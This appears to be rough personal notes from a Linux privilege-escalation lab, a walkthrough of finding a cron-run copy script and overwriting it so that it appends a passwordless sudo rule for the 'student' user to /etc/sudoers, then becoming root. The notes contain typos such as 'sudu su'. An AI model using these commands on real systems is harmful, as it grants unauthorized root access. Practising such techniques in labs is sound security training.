
- /etc/crontab
- find / -name message

we found 2 files which are the same name called message 
: This means there is some script/binary which is copying this file from student home directory to /tmp directory. 
Search for that script. If this script is doing simple copy operation, it must have source destination of the file in it.
Try to locate that by using grep command. On trying on different directories one by one (i.e. /, /etc, /opt) and on /usr directory, a match has been found.
starting from the The root directory "/" is also commonly referred to as the "root filesystem" to other files
1. /bin
2. /boot
3. /dev
4. /etc
5. /home
6. /lib
7. /media
8. /mnt
9. /opt
10. /proc
11. /root
12. /run
13. /sbin
14. /srv
15. /sys
16. /tmp
17. /usr
18. /var
- grep -nri “/tmp/our_file” /usr

Check the permissions on this script file and its contents. Commands 
- ls -l /usr/local/share/copy.sh
- cat /usr/local/share/copy.sh
to check if you have nay editors 
- cronjob -e 
in our case we cant use any editors 
Use printf to replace the original code with the following lines. Code: 
- printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
- cat /usr/local/share/copy.sh
check what permissions we have 
- sudo -l (we should have NOPASSWD on all permissions)
- sudu su 
done